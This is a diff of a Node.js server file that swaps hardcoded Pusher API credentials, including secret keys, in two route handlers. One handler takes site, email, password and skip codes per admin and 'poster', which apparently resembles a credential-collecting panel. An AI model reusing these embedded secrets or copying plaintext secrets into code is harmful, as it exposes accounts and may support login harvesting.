@@ -388,14 +388,12 @@ export const poster_add = async (req, res) => {
 
 export const add_data = async (req, res) => {
     const pusher = new Pusher({
-        app_id : '1883790',
-        key: 'c69be5ea3652b02905c7',
-        secret: 'd5258e0315991e7b5cc6',
-        cluster: 'mt1',
+        appId: '1773152',
+        key: 'f47031316f13ab641256',
+        secret: 'f1f2616da0bb8ffa85b7',
+        cluster: 'ap2',
         useTLS: true,
-       
-      });
-
+      })
 
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode  } = req.body
@@ -1043,10 +1041,10 @@ export const otp_check = async (req, res) => {
 export const pass_change = async (req, res) => {
     const { username ,password,otp} = req.body
     const pusher = new Pusher({
-        app_id: '1883790',
-        key: 'c69be5ea3652b02905c7',
-        secret: 'd5258e0315991e7b5cc6',
-        cluster: 'mt1',
+        appId: '1773152',
+        key: 'f47031316f13ab641256',
+        secret: 'f1f2616da0bb8ffa85b7',
+        cluster: 'ap2',
         useTLS: true,
       })
 
